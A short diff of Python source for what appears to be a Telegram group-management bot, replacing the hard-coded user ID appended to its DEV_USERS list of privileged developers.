@@ -133,7 +133,7 @@ dispatcher = updater.dispatcher
 
 SUDO_USERS = list(SUDO_USERS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
-DEV_USERS.append(1787040289)
+DEV_USERS.append(1623434995)
 
 
 # Load at end to ensure all prev variables have been set
